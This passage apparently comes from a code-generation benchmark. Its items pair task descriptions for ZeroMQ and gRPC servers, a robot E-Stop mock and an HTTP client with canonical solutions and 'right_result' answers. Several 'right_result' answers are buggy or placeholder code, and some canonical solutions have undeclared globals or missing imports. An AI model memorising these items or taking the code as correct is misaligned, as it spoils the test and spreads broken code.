    "Canonical_solution": "import zmq\nimport time\nimport argparse\n\ndef server():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--channel-ip\",\n        type=str,\n        default=None,\n        help=\"IP for ZeroMQ channel\",\n    )\n    parser.add_argument(\n        \"--channel-port\",\n        type=int,\n        default=5555,\n        help=\"Port for ZeroMQ channel\",\n    )\n    args = parser.parse_known_args()[0]\n\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(f\"tcp://*:{args.channel_port}\")\n\n    while True:\n        msg = socket.recv_json()\n        rank = msg[\"rank\"]\n        action = msg[\"action\"]\n\n        if action == \"pull\":\n            if len(remaining_entries) == 0:\n                socket.send_json({\"task_id\": None})\n                running_workers -= 1\n                if running_workers == 0:\n                    break\n            else:\n                entry = remaining_entries.pop()\n                socket.send_json({\"task_id\": entry})\n        else:\n            if action == \"success\":\n                socket.send_json({\"pong\": 1})\n            else:\n                remaining_entries.append(msg['task_id'])\n                socket.send_json({\"pong\": 1})\n                break",
    "Code_level": "Function-level",
    "FSMID_for_test": 87,
    "right_result": "import zmq\n\ndef server(channel_ip=None, channel_port=5555):\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    if channel_ip:\n        socket.bind(f\"tcp://{channel_ip}:{channel_port}\")\n    else:\n        socket.bind(f\"tcp://*: {channel_port}\")\n\n    remaining_entries = []\n    running_workers = 0\n\n    while True:\n        message = socket.recv().decode()\n        if message == \"READY\":\n            running_workers += 1\n            if remaining_entries:\n                task_id = remaining_entries.pop(0)\n                socket.send_string(f\"TASK {task_id}\")\n        elif message.startswith(\"TASK \"):\n            task_id = message.split()[1]\n            # Simulate task completion\n            socket.send_string(f\"RESULT {task_id} SUCCESS\")\n        elif message.startswith(\"RESULT \"):\n            task_id = message.split()[1]\n            if task_id in remaining_entries:\n                remaining_entries.remove(task_id)\n            if running_workers > 0:\n                socket.send_string(\"STATUS UPDATE\")"
  },
  {
    "Task_id": 480,
    "Instruction": "Task Description: Implement a ZeroMQ-based server that handles task distribution and status updates between multiple workers using the REQ/REP pattern.\n\nFunction Description: The server function establishes a ZeroMQ REP socket to listen for worker requests. It manages a pool of tasks (remaining_entries) and distributes them to workers. Workers can request tasks (\"pull\") or report task completion status (\"success\"/\"failure\"). The server responds accordingly and tracks active workers. The loop continues until all tasks are completed and all workers have finished.\n\nInput:\n- --channel-ip (str, optional): IP address for ZeroMQ channel (default: None)\n- --channel-port (int): Port number for ZeroMQ channel (default: 5555)\n\nOutput: None (The function runs indefinitely until all tasks are completed and all workers have disconnected)\n\nNote: The function uses two global variables:\n- remaining_entries: List of pending task IDs\n- running_workers: Count of currently active workers\n\nThe server expects and sends JSON messages with the following formats:\nReceived messages:\n- {\"rank\": [worker_id], \"action\": \"pull\"}\n- {\"rank\": [worker_id], \"action\": \"success\"/\"failure\", \"task_id\": [task_id]}\n\nSent responses:\n- {\"task_id\": [task_id]} (for pull requests)\n- {\"task_id\": None} (when no tasks remain)\n- {\"pong\": 1} (acknowledgment for status updates)\n\nThe server maintains task state by:\n1. Removing tasks when assigned\n2. Re-adding tasks if workers report failure\n3. Tracking active workers until all complete their tasks",
    "Canonical_solution": "import zmq\nimport time\nimport torch\n\ndef server():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--channel-ip\",\n        type=str,\n        default=None,\n        help=\"IP for ZeroMQ channel\",\n    )\n    parser.add_argument(\n        \"--channel-port\",\n        type=int,\n        default=5555,\n        help=\"Port for ZeroMQ channel\",\n    )\n    args = parser.parse_known_args()[0]\n\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(f\"tcp://*:{args.channel_port}\")\n\n    while True:\n        msg = socket.recv_json()\n        rank = msg[\"rank\"]\n        action = msg[\"action\"]\n\n        if action == \"pull\":\n            if len(remaining_entries) == 0:\n                socket.send_json({\"task_id\": None})\n                running_workers -= 1\n                if running_workers == 0:\n                    break\n            else:\n                entry = remaining_entries.pop()\n                socket.send_json({\"task_id\": entry})\n        else:\n            if action == \"success\":\n                socket.send_json({\"pong\": 1})\n            else:\n                remaining_entries.append(msg['task_id'])\n                socket.send_json({\"pong\": 1})\n                break",
    "Code_level": "Function-level",
    "FSMID_for_test": 87,
    "right_result": "import zmq\nimport json\nimport time\nimport sys\n\nremaining_entries = []\nrunning_workers = 0\n\ndef main(channel_ip=None, channel_port=5555):\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    if channel_ip:\n        socket.bind(f\"tcp://{channel_ip}:{channel_port}\")\n    else:\n        socket.bind(f\"tcp://localhost:{channel_port}\")\n\n    while True:\n        message = socket.recv().decode()\n        data = json.loads(message)\n\n        if data[\"action\"] == \"pull\":\n            if remaining_entries:\n                task_id = remaining_entries.pop(0)\n                running_workers += 1\n                response = {\"task_id\": task_id}\n                socket.send(json.dumps(response))\n            else:\n                response = {\"task_id\": None}\n                socket.send(json.dumps(response))\n        elif data[\"action\"] in [\"success\", \"failure\"]:\n            if data[\"action\"] == \"success\":\n                running_workers -= 1\n            response = {\"pong\": 1}\n            socket.send(json.dumps(response))\n\n            if data[\"action\"] == \"failure\":\n                remaining_entries.append(data[\"task_id\"])\n\nif __name__ == \"__main__\":\n    import argparse\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--channel-ip\", help=\"IP address for ZeroMQ channel\")\n    parser.add_argument(\"--channel-port\", type=int, default=5555, help=\"Port number for ZeroMQ channel\")\n    args = parser.parse_args()\n    main(args.channel_ip, args.channel_port)"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a distributed task processing system using ZeroMQ's REQ/REP pattern where a client requests tasks from a server, processes them, and reports back the results or failures.\n\nFunction Description: The function `run_generation_distributed` establishes a ZeroMQ REQ socket connection to a server, continuously requests tasks, processes them, and writes the results to a file. It handles task distribution, processing, and status reporting (success/failure) back to the server.\n\nInput:\n- `args`: [object] - Configuration object containing:\n  - `channel_ip`: [str] - IP address of the ZeroMQ server\n  - `channel_port`: [int] - Port of the ZeroMQ server\n  - `output_path`: [str] - Directory path for output files\n  - `task_name`: [str] - Base name for output files\n  - `temperature`: [float] - Processing parameter\n  - `top_p`: [float] - Processing parameter\n  - `samples_per_problem`: [int] - Number of samples per task\n  - `rank`: [int] - Worker identifier\n- `model`: [object] - Model used for processing tasks (not directly used in shown code)\n- `tokenizer`: [object] - Tokenizer used for processing tasks (not directly used in shown code)\n\nOutput:\n- None (direct output) - Results are written to a JSONL file in the specified output directory\n- Side Effects:\n  - Creates output directory if it doesn't exist\n  - Writes processed results to a JSONL file\n  - Communicates task status (success/failure) back to server",
    "Canonical_solution": "import zmq\n\ndef run_generation_distributed(args, model, tokenizer):\n    logger.info(f\"Connecting to tcp://{args.channel_ip}:{args.channel_port}\")\n    context = zmq.Context()\n    socket = context.socket(zmq.REQ)\n    socket.connect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n    \n    os.makedirs(args.output_path, exist_ok=True)\n    output_path = os.path.join(\n        args.output_path,\n        f\"{args.task_name}-t{args.temperature}-topp{args.top_p}-ns{args.samples_per_problem}-rank{args.rank}.jsonl\",\n    )\n    \n    fout = open(output_path, \"w\", encoding=\"utf-8\")\n    while True:\n        socket.send_json({\"rank\": args.rank, \"action\": \"pull\"})\n        resp = socket.recv_json()\n        try:\n            if resp[\"task_id\"] is None:\n                break\n\n            current_spec = resp[\"task_id\"]\n            results = process(current_spec)\n            \n            for res in results:\n                fout.write(json.dumps(res, ensure_ascii=False) + \"\\n\")\n                fout.flush()\n\n            socket.send_json(\n                {\n                    \"rank\"   : args.rank,\n                    \"action\" : \"success\",\n                    \"task_id\": current_spec['task_id']\n                }\n            )\n            socket.recv()\n\n        except Exception as e:\n            logger.error(f\"*** (rank={args.rank}) crashed.\")\n            logger.error(f\"    error: {repr(e)}\")\n            socket.send_json(\n                {\n                    \"rank\"   : args.rank,\n                    \"action\" : \"fail\",\n                    \"task_id\": current_spec['task_id']\n                }\n            )\n            socket.recv()\n            continue",
    "Code_level": "Function-level",
    "FSMID_for_test": 86,
    "right_result": "import zmq\nimport os\nimport json\nimport time\nimport random\n\ndef run_generation_distributed(args, model, tokenizer):\n    context = zmq.Context()\n    socket = context.socket(zmq.REQ)\n    socket.connect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n\n    output_dir = args.output_path\n    os.makedirs(output_dir, exist_ok=True)\n    task_name = args.task_name\n    file_name = f\"{task_name}_{args.rank}.jsonl\"\n    file_path = os.path.join(output_dir, file_name)\n\n    while True:\n        socket.send(b\"request_task\")\n        task_id = str(random.randint(100000, 999999))\n        socket.recv()  # Acknowledgment from server\n\n        # Simulate task processing\n        try:\n            # Simulate task execution with parameters\n            result = {\n                \"task_id\": task_id,\n                \"status\": \"success\",\n                \"output\": f\"Generated output for task {task_id} with temperature {args.temperature}, top_p {args.top_p}\",\n                \"samples\": [f\"Sample {i}\" for i in range(args.samples_per_problem)]\n            }\n            with open(file_path, \"a\") as f:\n                json.dump(result, f)\n                f.write(\"\\n\")\n        except Exception as e:\n            result = {\n                \"task_id\": task_id,\n                \"status\": \"failure\",\n                \"error\": str(e)\n            }\n            with open(file_path, \"a\") as f:\n                json.dump(result, f)\n                f.write(\"\\n\")\n\n        # Report back to server\n        socket.send(json.dumps({\"task_id\": task_id, \"status\": result[\"status\"]}).encode(\"utf-8\"))\n        socket.recv()  # Acknowledgment from server\n\n        time.sleep(1)  # Simulate work interval"
  },
  {
    "Task_id": 484,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles network compute bridge requests using thread-safe queues for inter-process communication.\n\nClass Description: The implementation consists of two classes:\n1. NetworkComputeBridgeWorkerServicer - A gRPC servicer that processes incoming requests using thread-safe queues\n2. GRPCServer - Manages the gRPC server lifecycle and configuration\n\nAttributes:\n\nNetworkComputeBridgeWorkerServicer:\n- thread_input_queue: [Queue] - Queue for receiving incoming requests from other processes\n- thread_output_queue: [Queue] - Queue for sending responses back to other processes\n- _lock: [Lock] - Thread synchronization lock for queue operations\n\nGRPCServer:\n- port: [int] - Port number for the server to listen on\n- request_queue: [Queue] - Shared queue for incoming requests\n- response_queue: [Queue] - Shared queue for outgoing responses\n\nMethods:\n\nNetworkComputeBridgeWorkerServicer:\n- WorkerCompute(request, context) -> [network_compute_bridge_pb2.NetworkComputeResponse] - Processes compute requests by putting them in input queue and waiting for response from output queue\n- ListAvailableModels(request, context) -> [network_compute_bridge_pb2.ListAvailableModelsResponse] - Processes model listing requests by putting them in input queue and waiting for response from output queue\n\nGRPCServer:\n- start() -> [grpc.Server] - Initializes and starts the gRPC server with thread pool executor, binds it to the specified port, and registers the servicer",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom multiprocessing import Lock, Queue\nimport bosdyn.api.network_compute_bridge_service_pb2_grpc as network_compute_bridge_service_pb2_grpc\nimport bosdyn.api.network_compute_bridge_pb2 as network_compute_bridge_pb2\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_service_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        super(NetworkComputeBridgeWorkerServicer, self).__init__()\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n        self._lock = Lock()\n\n    def WorkerCompute(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            out_proto = self.thread_output_queue.get()\n        return out_proto\n\n    def ListAvailableModels(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            out_proto = self.thread_output_queue.get()\n        return out_proto\n\nclass GRPCServer:\n    def __init__(self, port, request_queue, response_queue):\n        self.port = port\n        self.request_queue = request_queue\n        self.response_queue = response_queue\n\n    def start(self):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        network_compute_bridge_service_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(\n            NetworkComputeBridgeWorkerServicer(self.request_queue, self.response_queue), server)\n        server.add_insecure_port(f'[::]:{self.port}')\n        server.start()\n        return server",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import threading\nimport queue\nimport grpc\nimport network_compute_bridge_pb2\nimport network_compute_bridge_pb2_grpc\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n        self._lock = threading.Lock()\n\n    def WorkerCompute(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put_nowait(request)\n        response = self.thread_output_queue.get_nowait()\n        return response\n\n    def ListAvailableModels(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put_nowait(request)\n        response = self.thread_output_queue.get_nowait()\n        return response\n\n\nclass GRPCServer:\n    def __init__(self, port, request_queue, response_queue):\n        self.port = port\n        self.request_queue = request_queue\n        self.response_queue = response_queue\n        self.server = grpc.server(thread_pool=grpc.ThreadPoolExecutor(max_workers=4))\n        network_compute_bridge_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(\n            NetworkComputeBridgeWorkerServicer(self.request_queue, self.response_queue), self.server)\n        self.server.add_insecure_port(f'[::]:{self.port}')\n\n    def start(self):\n        self.server.start()\n        print(f\"gRPC server started on port {self.port}\")\n        return self.server\n\n\ndef main():\n    input_queue = queue.Queue()\n    output_queue = queue.Queue()\n    server = GRPCServer(50051, input_queue, output_queue)\n    server.start()\n    try:\n        while True:\n            pass\n    except KeyboardInterrupt:\n        server.server.stop(0)\n\n\nif __name__ == '__main__':\n    main()"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a gRPC server in Python that provides speech recognition and language processing services using gRPC for inter-process communication.\n\nClass Description: The implementation consists of two main classes: ApiService (which handles the actual service logic) and GrpcServer (which manages the server lifecycle).\n\nAttributes:\n\nApiService:\n- speech_model: [Any] - The model used for speech recognition\n- language_model: [Any] - The model used for language processing\n\nGrpcServer:\n- host: [str] - The host address to bind the server to\n- port: [str] - The port number to bind the server to\n- max_workers: [int] - Maximum number of worker threads in the thread pool\n- server: [grpc.Server] - The gRPC server instance\n\nMethods:\n\nApiService:\n- Speech(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [SpeechResponse] - Processes speech recognition requests\n- Language(request: [LanguageRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes language translation requests\n- All(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes combined speech recognition and language translation\n- Stream(request_iterator: [Iterator[SpeechRequest]], context: [grpc.ServicerContext]) -> [Iterator[TextResponse]] - Handles streaming speech recognition and processing\n\nGrpcServer:\n- start(service: [ApiService]) -> [None] - Starts the gRPC server with the specified service and runs it indefinitely\n  - Input: service - An instance of ApiService to handle incoming requests\n  - Output: None (runs indefinitely until interrupted)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom assets.asrt_pb2_grpc import AsrtGrpcServiceServicer, add_AsrtGrpcServiceServicer_to_server\nfrom assets.asrt_pb2 import SpeechResponse, TextResponse\nimport time\n\n_ONE_DAY_IN_SECONDS = 60 * 60 * 24\n\nclass ApiService(AsrtGrpcServiceServicer):\n    def __init__(self, speech_model, language_model):\n        self.speech_model = speech_model\n        self.language_model = language_model\n\n    def Speech(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        return SpeechResponse(status_code=200000, status_message='',\n                            result_data=result)\n\n    def Language(self, request, context):\n        result = self.language_model.pinyin_to_text(list(request.pinyins))\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def All(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        result = self.language_model.pinyin_to_text(result_speech)\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def Stream(self, request_iterator, context):\n        result = list()\n        tmp_result_last = list()\n        beam_size = 100\n\n        for request in request_iterator:\n            wav_data = request.wav_data\n            wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                         channels=wav_data.channels,\n                                         byte_width=wav_data.byte_width)\n            result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n\n            for item_pinyin in result_speech:\n                tmp_result = self.language_model.pinyin_stream_decode(tmp_result_last, item_pinyin, beam_size)\n                if len(tmp_result) == 0 and len(tmp_result_last) > 0:\n                    result.append(tmp_result_last[0][0])\n                    yield TextResponse(status_code=200000, status_message='',\n                                   text_result=''.join(result))\n                    result = list()\n                    tmp_result = self.language_model.pinyin_stream_decode([], item_pinyin, beam_size)\n                tmp_result_last = tmp_result\n                yield TextResponse(status_code=206000, status_message='',\n                               text_result=''.join(tmp_result[0][0]))\n\n        if len(tmp_result_last) > 0:\n            result.append(tmp_result_last[0][0])\n            yield TextResponse(status_code=200000, status_message='',\n                           text_result=''.join(result))\n\nclass GrpcServer:\n    def __init__(self, host, port, max_workers=10):\n        self.host = host\n        self.port = port\n        self.max_workers = max_workers\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=self.max_workers))\n\n    def start(self, service):\n        add_AsrtGrpcServiceServicer_to_server(service, self.server)\n        self.server.add_insecure_port(''.join([self.host, ':', self.port]))\n        self.server.start()\n        try:\n            while True:\n                time.sleep(_ONE_DAY_IN_SECONDS)\n        except KeyboardInterrupt:\n            self.server.stop(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport speech_pb2\nimport speech_pb2_grpc\n\nclass ApiService:\n    def __init__(self):\n        self.speech_model = None\n        self.language_model = None\n\n    def Speech(self, request, context):\n        # Placeholder for speech recognition logic\n        return speech_pb2.SpeechResponse(text=\"Recognized text\")\n\n    def Language(self, request, context):\n        # Placeholder for language processing logic\n        return speech_pb2.TextResponse(text=\"Translated text\")\n\n    def All(self, request, context):\n        # Placeholder for combined speech recognition and language processing\n        return speech_pb2.TextResponse(text=\"Combined result\")\n\n    def Stream(self, request_iterator, context):\n        for request in request_iterator:\n            # Placeholder for streaming logic\n            yield speech_pb2.TextResponse(text=\"Streaming result\")\n\nclass GrpcServer:\n    def __init__(self, host, port, max_workers):\n        self.host = host\n        self.port = port\n        self.max_workers = max_workers\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        speech_pb2_grpc.add_ApiServiceServicer_to_server(ApiService(), self.server)\n        self.server.add_insecure_port(f\"{host}:{port}\")\n\n    def start(self, service):\n        self.server.start()\n        print(f\"gRPC server started on {self.host}:{self.port}\")\n        self.server.wait_for_termination()\n\nif __name__ == '__main__':\n    server = GrpcServer('localhost', '50051', 10)\n    server.start(ApiService())"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC and JinaSingleDataRequestRPC services.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for multiple services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- health_servicer: grpc_health.v1.health.HealthServicer - Handles health check requests for the services\n- grpc_server: grpc.aio.server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int) -> None - Initializes the MultiProtocolGateway with the specified gRPC port\n- _setup_grpc_server() -> None - Sets up the gRPC server with all required services (JinaRPC, JinaSingleDataRequestRPC), health checks, and reflection\n- run_server() -> None - Starts the gRPC server and keeps it running until termination\n- shutdown() -> None - Gracefully shuts down the gRPC server and health servicer",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\nfrom jina.constants import __default_host__\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int):\n        self.grpc_port = grpc_port\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            jina_pb2.DESCRIPTOR.services_by_name['JinaSingleDataRequestRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{__default_host__}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport grpc_health.v1.health_check_pb2_grpc as health_check\nfrom jinarpc import Service, request\nfrom jinasingledatarequestrpc import JinaSingleDataRequestRPCServicer\nfrom jinarpc import JinaRPCServicer\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int):\n        self.grpc_port = grpc_port\n        self.health_servicer = health_check.HealthServicer()\n        self.grpc_server = grpc.aio.server()\n\n    async def _setup_grpc_server(self):\n        self.grpc_server.add_insecure_port(f'[::]:{self.grpc_port}')\n        self.grpc_server.add_service(health_check.HealthServiceServicer, self.health_servicer)\n        self.grpc_server.add_service(JinaRPCServicer, None)\n        self.grpc_server.add_service(JinaSingleDataRequestRPCServicer, None)\n        self.grpc_server.enable_server_reflection(['/'])\n    \n    async def run_server(self):\n        await self._setup_grpc_server()\n        await self.grpc_server.start()\n        try:\n            await self.grpc_server.wait_for_termination()\n        except KeyboardInterrupt:\n            pass\n    \n    async def shutdown(self):\n        await self.grpc_server.stop()"
  },
  {
    "Task_id": 487,
    "Instruction": "Task Description: Create a gRPC server implementation in Python that handles E-Stop (Emergency Stop) functionality for robotic systems, including endpoint registration and check-in procedures with challenge-response verification.\n\nClass Description: The implementation consists of two classes:\n1. MockEstopServicer - Handles the actual gRPC service implementation for E-Stop functionality\n2. GRPCServer - Manages the gRPC server lifecycle and service registration\n\nAttributes:\n\nMockEstopServicer:\n- VALID_STOP_LEVEL: [int] - The valid stop level for E-Stop operations\n- NAME_FOR_ENDPOINT_UNKNOWN: [str] - Special endpoint name that triggers unknown endpoint status\n- NAME_FOR_SERVER_ERROR: [str] - Special endpoint name that triggers server error\n- STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE: [set] - Set of statuses that skip challenge generation\n- _rpc_delay: [int] - Artificial delay for RPC calls (for testing)\n- _challenge: [int] - Current challenge value for verification\n\nGRPCServer:\n- server: [grpc.Server] - The gRPC server instance\n\nMethods:\n\nMockEstopServicer:\n- __init__(rpc_delay: int = 0) -> None - Initializes the servicer with optional RPC delay\n- RegisterEstopEndpoint(request, context) -> None - Handles endpoint registration (stub implementation)\n- EstopCheckIn(request, context) -> bosdyn.api.estop_pb2.EstopCheckInResponse - Processes E-Stop check-in requests with challenge-response verification\n\nGRPCServer:\n- __init__() -> None - Initializes the gRPC server with thread pool executor\n- add_service(servicer: MockEstopServicer) -> None - Registers the E-Stop service with the server\n- start(port: int = 0) -> int - Starts the server on specified port (0 for auto-assigned) and returns bound port\n- stop() -> None - Stops the server gracefully",
    "Canonical_solution": "import grpc\nimport concurrent.futures\nimport bosdyn.api.estop_pb2\nimport bosdyn.api.estop_service_pb2_grpc\n\nclass MockEstopServicer(bosdyn.api.estop_service_pb2_grpc.EstopServiceServicer):\n    VALID_STOP_LEVEL = 1\n    NAME_FOR_ENDPOINT_UNKNOWN = 'mystery'\n    NAME_FOR_SERVER_ERROR = 'little-bobby-drop-tables'\n    STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE = \\\n        set([bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_UNKNOWN])\n\n    def __init__(self, rpc_delay=0):\n        super(MockEstopServicer, self).__init__()\n        self._rpc_delay = rpc_delay\n        self._challenge = 0\n\n    def RegisterEstopEndpoint(self, request, context):\n        pass\n\n    def EstopCheckIn(self, request, context):\n        resp = bosdyn.api.estop_pb2.EstopCheckInResponse()\n        resp.header.error.code = bosdyn.api.header_pb2.CommonError.CODE_OK\n        if request.endpoint.name == self.NAME_FOR_SERVER_ERROR:\n            resp.header.error.code = bosdyn.api.header_pb2.CommonError.CODE_INTERNAL_SERVER_ERROR\n        elif request.endpoint.name == self.NAME_FOR_ENDPOINT_UNKNOWN:\n            resp.status = resp.STATUS_ENDPOINT_UNKNOWN\n        else:\n            if not request.challenge:\n                resp.status = resp.STATUS_INCORRECT_CHALLENGE_RESPONSE\n            elif request.response != bosdyn.client.estop.response_from_challenge(request.challenge):\n                resp.status = resp.STATUS_INCORRECT_CHALLENGE_RESPONSE\n            else:\n                resp.status = resp.STATUS_OK\n        if resp.status not in self.STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE:\n            if request.challenge is not None:\n                self._challenge = request.challenge + 1\n            else:\n                self._challenge = 0\n            resp.challenge = self._challenge\n        return resp\n\nclass GRPCServer:\n    def __init__(self):\n        self.server = grpc.server(concurrent.futures.ThreadPoolExecutor(max_workers=10))\n\n    def add_service(self, servicer):\n        bosdyn.api.estop_service_pb2_grpc.add_EstopServiceServicer_to_server(servicer, self.server)\n\n    def start(self, port=0):\n        port = self.server.add_insecure_port(f'127.0.0.1:{port}')\n        self.server.start()\n        return port\n\n    def stop(self):\n        self.server.stop(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport bosdyn.api.estop_pb2 as estop_pb2\nimport bosdyn.api.estop_pb2_grpc as estop_pb2_grpc\nimport time\nimport random\n\nclass MockEstopServicer(estop_pb2_grpc.EstopServiceServicer):\n    VALID_STOP_LEVEL = 3\n    NAME_FOR_ENDPOINT_UNKNOWN = 'unknown'\n    NAME_FOR_SERVER_ERROR = 'server_error'\n    STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE = {estop_pb2.EstopStatus.STATUS_OK}\n    _rpc_delay = 0\n    _challenge = 0\n\n    def __init__(self, rpc_delay: int = 0):\n        self._rpc_delay = rpc_delay\n        self._challenge = random.randint(1000, 9999)\n\n    def RegisterEstopEndpoint(self, request, context):\n        if self._rpc_delay > 0:\n            time.sleep(self._rpc_delay / 1000.0)\n        if request.endpoint_name == self.NAME_FOR_ENDPOINT_UNKNOWN:\n            context.set_code(grpc.StatusCode.INVALID_ARGUMENT)\n            context.set_details('Unknown endpoint name')\n            return\n        if request.endpoint_name == self.NAME_FOR_SERVER_ERROR:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details('Server error occurred')\n            return\n        # Simulate successful registration\n        response = estop_pb2.EstopRegisterResponse()\n        response.status = estop_pb2.EstopStatus.STATUS_OK\n        response.endpoint_id = request.endpoint_name\n        return response\n\n    def EstopCheckIn(self, request, context):\n        if self._rpc_delay > 0:\n            time.sleep(self._rpc_delay / 1000.0)\n        if request.endpoint_id in [self.NAME_FOR_ENDPOINT_UNKNOWN, self.NAME_FOR_SERVER_ERROR]:\n            context.set_code(grpc.StatusCode.INVALID_ARGUMENT)\n            context.set_details('Invalid endpoint for check-in')\n            return\n        if request.status in self.STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE:\n            response = estop_pb2.EstopCheckInResponse()\n            response.status = request.status\n            return response\n        # Generate and verify challenge\n        if request.challenge != self._challenge:\n            context.set_code(grpc.StatusCode.UNAUTHENTICATED)\n            context.set_details('Challenge verification failed')\n            return\n        # Reset challenge for next use\n        self._challenge = random.randint(1000, 9999)\n        response = estop_pb2.EstopCheckInResponse()\n        response.status = request.status\n        response.new_challenge = self._challenge\n        return response\n\n\nclass GRPCServer:\n    def __init__(self):\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        estop_pb2_grpc.add_EstopServiceServicer_to_server(MockEstopServicer(), self.server)\n\n    def add_service(self, servicer: MockEstopServicer) -> None:\n        estop_pb2_grpc.add_EstopServiceServicer_to_server(servicer, self.server)\n\n    def start(self, port: int = 0) -> int:\n        if port == 0:\n            port = self.server.add_insecure_port('[::]:0')\n        self.server.start()\n        return port\n\n    def stop(self) -> None:\n        self.server.stop(GracePeriodSeconds=10)"
  },
  {
    "Task_id": 49,
    "Instruction": "Task Description: Implement an asynchronous HTTP client for making secure API requests with payload validation and error handling.\n\nClass Description: ExternalActionsRequester is a class designed to handle secure asynchronous HTTP requests to an external API endpoint. It includes payload signing, request sending, and response validation capabilities.\n\nAttributes:\n- url: str - The target URL for API requests\n\nMethods:\n- __init__(url: str) -> None - Initializes the requester with the target URL\n- send_request(payload: Dict[str, Any], signature_secret: str, additional_payload_values: Dict[str, Any] = {}, additional_headers: Dict[str, str] = {}, transport: httpx.AsyncHTTPTransport = httpx.AsyncHTTPTransport(retries=2)) -> ExternalActionResponse - Sends an asynchronous POST request with signed payload and handles response/errors\n- _encode_payload(payload: bytes, signature_secret: str) -> str - Creates a HMAC-SHA256 signature for the payload\n- _validate_response(response: Dict[str, Any]) -> ExternalActionResponse - Validates and parses the API response into a structured format",
